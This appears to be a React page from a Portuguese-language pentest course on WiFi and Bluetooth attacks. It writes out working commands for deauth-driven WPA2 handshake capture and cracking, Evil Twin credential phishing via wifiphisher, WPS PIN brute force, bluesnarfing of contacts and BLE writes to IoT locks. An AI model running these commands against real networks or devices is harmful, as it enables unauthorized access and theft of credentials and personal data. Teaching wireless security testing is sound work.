import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function WirelessBluetooth() {
  return (
    <PageContainer
      title="Wireless & Bluetooth — Pentest de Redes Sem Fio"
      subtitle="Ataques a redes WiFi e Bluetooth. Inclui captura de handshakes, cracking WPA2, Evil Twin, deauth attacks, Bluetooth scanning/exploitation, e ferramentas como Aircrack-ng, Bettercap e Reaver."
      difficulty="avancado"
      timeToRead="30 min"
    >
      <h2>WiFi Pentest — Fundamentos</h2>
      <p>
        Pentest de WiFi envolve testar a segurança de redes sem fio: força da criptografia (WPA2/WPA3),
        resistência a ataques de desautenticação, detecção de rogue APs, e teste de senhas fracas.
        Requer um <strong>adaptador WiFi com suporte a modo monitor e injeção de pacotes</strong>.
      </p>

      <AlertBox type="warning" title="Hardware necessário">
        A placa WiFi interna do notebook geralmente NÃO suporta modo monitor. É necessário um
        adaptador USB WiFi compatível. Modelos recomendados: Alfa AWUS036ACH (AC, 2.4/5GHz),
        Alfa AWUS036NHA (N, 2.4GHz), ou TP-Link TL-WN722N v1 (chipset Atheros AR9271).
      </AlertBox>

      <h2>Configuração do Adaptador WiFi</h2>
      <CodeBlock
        title="Habilitar modo monitor e verificar injeção"
        code={`# ═══════════════════════════════════════════════════
# IDENTIFICAR ADAPTADOR
# ═══════════════════════════════════════════════════
iwconfig
# Lo no output:
# wlan0     IEEE 802.11  Mode:Managed  ...
# wlan1     IEEE 802.11  Mode:Managed  ...
# ↑ wlan0 = interno (provavelmente)
# ↑ wlan1 = adaptador USB (se plugado)

# Verificar driver e chipset:
airmon-ng
# PHY     Interface  Driver      Chipset
# phy0    wlan0      iwlwifi     Intel ...       ← interno
# phy1    wlan1      ath9k_htc   Atheros AR9271  ← USB! ✓

# ═══════════════════════════════════════════════════
# HABILITAR MODO MONITOR
# ═══════════════════════════════════════════════════

# PASSO 1: Matar processos que interferem
sudo airmon-ng check kill
# Mata: NetworkManager, wpa_supplicant, dhclient
# Esses processos tentam conectar a redes e atrapalham
# a captura de pacotes

# PASSO 2: Iniciar modo monitor
sudo airmon-ng start wlan1
# Output:
# (monitor mode enabled on wlan1mon)
# ↑ Interface muda para wlan1mon

# Verificar:
iwconfig wlan1mon
# Mode:Monitor  ← Confirmado!

# PASSO 3: Testar injeção de pacotes
sudo aireplay-ng --test wlan1mon
# Injection is working!  ← OK!
# Se falhar → adaptador não suporta injeção

# ═══════════════════════════════════════════════════
# MUDAR CANAL MANUALMENTE
# ═══════════════════════════════════════════════════
sudo iwconfig wlan1mon channel 6
# Fixa no canal 6 (necessário para ataques direcionados)

# ═══════════════════════════════════════════════════
# DESABILITAR MODO MONITOR (após terminar)
# ═══════════════════════════════════════════════════
sudo airmon-ng stop wlan1mon
sudo systemctl start NetworkManager
# Restaura modo normal e reconecta à rede`}
      />

      <h2>Aircrack-ng Suite — Captura e Cracking WPA2</h2>
      <CodeBlock
        title="Capturar handshake e crackear senha WPA2"
        code={`# ═══════════════════════════════════════════════════
# PASSO 1: ESCANEAR REDES DISPONÍVEIS
# ═══════════════════════════════════════════════════
sudo airodump-ng wlan1mon
# Output em tempo real:
#
# BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45  150      85     6   54e  WPA2 CCMP    PSK   EMPRESA_WIFI
# 11:22:33:44:55:66  -72  80       12     1   54e  WPA2 CCMP    PSK   VIZINHO
#
# Colunas explicadas:
# BSSID   = MAC do Access Point
# PWR     = Potência do sinal (dBm). -45 = forte, -80 = fraco
# Beacons = Pacotes beacon recebidos (mais = mais visível)
# #Data   = Pacotes de dados capturados
# CH      = Canal da rede (1-13 em 2.4GHz, 36-165 em 5GHz)
# MB      = Velocidade máxima (54e = 802.11n)
# ENC     = Criptografia (WPA2, WPA, WEP, OPN = aberta)
# CIPHER  = Cifra (CCMP = AES, TKIP = mais fraco)
# AUTH    = Autenticação (PSK = senha, MGT = RADIUS/Enterprise)
# ESSID   = Nome da rede
#
# Parte inferior mostra CLIENTES conectados:
# BSSID              STATION            PWR  Rate  Lost  Frames
# AA:BB:CC:DD:EE:FF  FF:EE:DD:CC:BB:AA  -35  54e   0     482
# ↑ AP                ↑ Cliente conectado ao AP

# ═══════════════════════════════════════════════════
# PASSO 2: FOCAR NA REDE ALVO
# ═══════════════════════════════════════════════════
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan1mon
# -c 6             = fixar no canal 6 (canal do alvo)
# --bssid AA:BB:.. = focar apenas nesse AP
# -w captura       = salvar captura em arquivo "captura-01.cap"
# Manter rodando! Precisamos capturar o 4-way handshake.

# ═══════════════════════════════════════════════════
# PASSO 3: FORÇAR HANDSHAKE (deauth attack)
# ═══════════════════════════════════════════════════
# Em OUTRO terminal (manter airodump rodando!):
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan1mon
# -0 5              = enviar 5 pacotes de deautenticação
#   Tipo 0 = deauthentication frame
#   5 pacotes = geralmente suficiente para desconectar o cliente
# -a AA:BB:..       = BSSID do AP (access point)
# -c FF:EE:..       = MAC do cliente a desconectar
#   Se omitir -c → desautentica TODOS os clientes (broadcast)
#
# O que acontece:
# 1. Enviamos frames de deauth spoofados como se fossem do AP
# 2. Cliente recebe e desconecta
# 3. Cliente reconecta AUTOMATICAMENTE
# 4. Na reconexão, o 4-way handshake ocorre
# 5. airodump-ng captura o handshake!
#
# Quando capturado, airodump mostra no canto superior direito:
# [ WPA handshake: AA:BB:CC:DD:EE:FF ]  ← SUCESSO!

# ═══════════════════════════════════════════════════
# PASSO 4: CRACKEAR A SENHA
# ═══════════════════════════════════════════════════
sudo aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt
# captura-01.cap  = arquivo com o handshake capturado
# -w rockyou.txt  = wordlist de senhas (14 milhões de senhas)
#
# Output durante o cracking:
# Aircrack-ng 1.7
# [00:01:23] 123456/14344392 keys tested (1234.56 k/s)
# Current passphrase: Empresa2024!
#
#     KEY FOUND! [ Empresa2024! ]
#
# Master Key     : AB CD EF 12 34 56 78 90 ...
# Transient Key  : 00 11 22 33 44 55 66 77 ...
# EAPOL HMAC     : AA BB CC DD EE FF 00 11 ...
#
# → Senha encontrada: Empresa2024!

# ═══════════════════════════════════════════════════
# CRACKING COM GPU (muito mais rápido!)
# ═══════════════════════════════════════════════════
# Converter para formato hashcat:
# Ferramenta online: https://hashcat.net/cap2hashcat/
# Ou:
hcxpcapngtool -o hash.hc22000 captura-01.cap
# Converte .cap → formato hashcat 22000

# Crackear com hashcat (GPU):
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000 = WPA-PBKDF2-PMKID+EAPOL
# GPU: milhões de hashes/segundo vs milhares com CPU!

# Com regras (variações de senhas):
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
# -r = regras de mutação (adiciona números, símbolos, capitaliza, etc.)`}
      />

      <h2>Evil Twin Attack</h2>
      <CodeBlock
        title="Criar AP falso para capturar credenciais"
        code={`# ═══════════════════════════════════════════════════
# CONCEITO DO EVIL TWIN
# ═══════════════════════════════════════════════════
# 1. Criar AP falso com MESMO nome (ESSID) da rede alvo
# 2. Desautenticar clientes do AP legítimo
# 3. Clientes reconectam no AP falso (sinal mais forte)
# 4. Apresentar portal captive pedindo a senha WiFi
# 5. Cliente digita a senha → capturada!
# 6. Testar a senha capturada no AP legítimo

# ═══════════════════════════════════════════════════
# USANDO WIFIPHISHER (automatiza tudo)
# ═══════════════════════════════════════════════════
sudo apt install wifiphisher

sudo wifiphisher -aI wlan1mon -eI wlan0 -p firmware-upgrade
# -aI wlan1mon  = interface para o AP falso (modo monitor)
# -eI wlan0     = interface para internet (compartilhar conexão)
# -p firmware-upgrade = scenario:
#   Mostra página "Firmware upgrade required"
#   Pede a senha WiFi para "completar a atualização"
#
# Scenarios disponíveis:
# firmware-upgrade    — atualização de firmware (pede senha WiFi)
# oauth-login         — login com redes sociais
# plugin-update       — atualização de plugin do browser
# network-manager-connect — simula reconexão do NetworkManager

# Wifiphisher automaticamente:
# 1. Escaneia redes → você escolhe o alvo
# 2. Cria AP clone com mesmo ESSID e BSSID
# 3. Envia deauth para desconectar clientes
# 4. Clientes conectam no clone
# 5. Portal captive captura a senha
# 6. Mostra a senha capturada no terminal!`}
      />

      <h2>WPS Attack com Reaver</h2>
      <CodeBlock
        title="Explorar WPS (Wi-Fi Protected Setup) habilitado"
        code={`# ═══════════════════════════════════════════════════
# O QUE É WPS
# ═══════════════════════════════════════════════════
# WPS permite conectar pressionando um botão ou digitando
# um PIN de 8 dígitos. O PIN tem apenas 11.000 combinações
# possíveis (não 10^8!) por causa de um design flaw:
# - Os 8 dígitos são verificados em DUAS METADES de 4
# - Primeira metade: 10^4 = 10.000 combinações
# - Segunda metade: 10^3 = 1.000 combinações (último é checksum)
# - Total: ~11.000 tentativas = ~4-10 horas!

# ═══════════════════════════════════════════════════
# VERIFICAR SE WPS ESTÁ HABILITADO
# ═══════════════════════════════════════════════════
sudo wash -i wlan1mon
# Output:
# BSSID              Ch  WPS  Lock  Vendor    ESSID
# AA:BB:CC:DD:EE:FF   6  2.0  No    RealTek   EMPRESA_WIFI
#                         ↑    ↑
#                    WPS ativo  Não bloqueado → VULNERÁVEL!

# ═══════════════════════════════════════════════════
# ATAQUE COM REAVER
# ═══════════════════════════════════════════════════
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
# -i wlan1mon     = interface em modo monitor
# -b AA:BB:..     = BSSID do AP alvo
# -c 6            = canal da rede
# -vv             = very verbose (mostra cada tentativa)
#
# Output:
# [+] Trying pin "12345670"
# [+] Trying pin "12345671"
# ...
# [+] WPS PIN: '23456789'
# [+] WPA PSK: 'SenhaDoWiFi123!'
# → Descobriu o PIN E a senha WPA!

# Flags adicionais:
# -d 1   = delay de 1 segundo entre tentativas (evita lockout)
# -t 3   = timeout de 3 segundos para respostas
# -N     = não enviar NACK (mais rápido em alguns APs)
# -S     = usar fragmentação de pacotes pequenos
# -K 1   = Pixie Dust attack (MUITO mais rápido se AP vulnerável!)

# ═══════════════════════════════════════════════════
# PIXIE DUST ATTACK (segundos em vez de horas!)
# ═══════════════════════════════════════════════════
# Se o AP usa números aleatórios fracos na geração do PIN:
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1
# -K 1 = Pixie Dust mode
# Captura APENAS a primeira troca e calcula o PIN offline!
# Tempo: segundos a minutos (vs horas no brute force)

# Alternativa com bully:
sudo bully wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
# Outra ferramenta para WPS, às vezes funciona quando Reaver não`}
      />

      <h2>Bluetooth Hacking</h2>
      <CodeBlock
        title="Scanning, enumeração e exploração Bluetooth"
        code={`# ═══════════════════════════════════════════════════
# FERRAMENTAS BLUETOOTH
# ═══════════════════════════════════════════════════
sudo apt install bluetooth bluez bluez-tools btscanner

# Verificar adaptador Bluetooth:
hciconfig
# hci0: Type: Primary  Bus: USB
#       BD Address: AA:BB:CC:DD:EE:FF  ACL MTU: 1021
#       UP RUNNING

# Se DOWN:
sudo hciconfig hci0 up

# ═══════════════════════════════════════════════════
# SCANNING — DESCOBRIR DISPOSITIVOS
# ═══════════════════════════════════════════════════

# Scan clássico (Bluetooth BR/EDR):
sudo hcitool scan
# Scanning...
#   11:22:33:44:55:66  "iPhone de João"
#   AA:BB:CC:DD:EE:FF  "Samsung Galaxy S23"
#   FF:EE:DD:CC:BB:AA  "Fone Bluetooth"
# ↑ MAC e nome do dispositivo

# Scan BLE (Bluetooth Low Energy):
sudo hcitool lescan
# LE Scan...
# 11:22:33:44:55:66 Smart Lock XYZ
# AA:BB:CC:DD:EE:FF Fitness Band ABC
# BLE é usado em: smartwatches, fechaduras, sensores IoT

# Scan com informações detalhadas:
sudo btscanner
# Interface gráfica TUI que mostra:
# - Nome, MAC, classe do dispositivo
# - Serviços disponíveis (SDP)
# - Fabricante
# - Features suportadas

# ═══════════════════════════════════════════════════
# ENUMERAÇÃO DE SERVIÇOS (SDP)
# ═══════════════════════════════════════════════════
# SDP (Service Discovery Protocol) lista serviços do dispositivo:
sdptool browse 11:22:33:44:55:66
# Output:
# Service Name: OBEX Object Push
# Channel: 12
# Profile: OBEX Object Push (0x1105)
#
# Service Name: Headset Audio Gateway
# Channel: 3
# Profile: Headset (0x1108)
#
# Serviços interessantes para ataque:
# OBEX Object Push → pode enviar/receber arquivos!
# Serial Port → comunicação serial (pode ser explorada)
# BNEP → Bluetooth Network (pode acessar rede)

# ═══════════════════════════════════════════════════
# ATAQUES BLUETOOTH
# ═══════════════════════════════════════════════════

# ─── BLUEPRINTING ─────────────────────────────────
# Identificar dispositivo sem parear:
sudo l2ping 11:22:33:44:55:66 -c 5
# Ping L2CAP — verifica se dispositivo responde
# -c 5 = 5 pings

# ─── BLUESNARFING (roubar dados) ──────────────────
# Explorar OBEX para baixar contatos, SMS, etc.:
obexftp -b 11:22:33:44:55:66 -c 12 -l
# -b = MAC do alvo
# -c 12 = canal OBEX (encontrado via SDP)
# -l = listar diretório

obexftp -b 11:22:33:44:55:66 -c 12 -g telecom/pb.vcf
# -g = GET (baixar arquivo)
# telecom/pb.vcf = agenda de contatos em formato vCard!

# ─── BLUEJACKING (enviar mensagens) ──────────────
# Enviar mensagem/contato não solicitado:
obexftp -b 11:22:33:44:55:66 -c 12 -p mensagem.txt
# -p = PUT (enviar arquivo)
# Antigamente usado para spam, hoje menos eficaz

# ═══════════════════════════════════════════════════
# BETTERCAP — BLUETOOTH + WIFI
# ═══════════════════════════════════════════════════
sudo bettercap

# Dentro do Bettercap:
> ble.recon on                # Iniciar scan BLE
> ble.show                    # Mostrar dispositivos encontrados
> ble.enum MAC_ADDRESS        # Enumerar serviços/características
# Mostra serviços GATT, handles, e valores
# Pode ler/escrever características BLE
> ble.write MAC HANDLE VALUE  # Escrever valor em característica
# Útil para explorar dispositivos IoT: trancar/destrancar fechaduras,
# mudar configurações de sensores, etc.

# WiFi com Bettercap:
> wifi.recon on               # Scan WiFi
> wifi.show                   # Listar redes e clientes
> wifi.deauth AP_BSSID        # Deauth attack
> wifi.assoc AP_BSSID         # Association attack (PMKID)`}
      />
    </PageContainer>
  );
}
